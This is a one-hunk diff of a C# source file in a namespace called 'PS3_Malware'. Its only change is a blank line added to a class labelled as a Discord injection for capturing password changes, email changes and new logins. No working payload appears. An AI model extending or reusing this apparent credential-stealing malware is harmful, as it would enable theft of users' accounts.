@@ -823,6 +823,7 @@ namespace PS3_Malware
     internal class MisakiV6 //Injection Discord (change pw, change email, new login)
     {
         #region "Start"
+
         public static void Start()
         {
             try
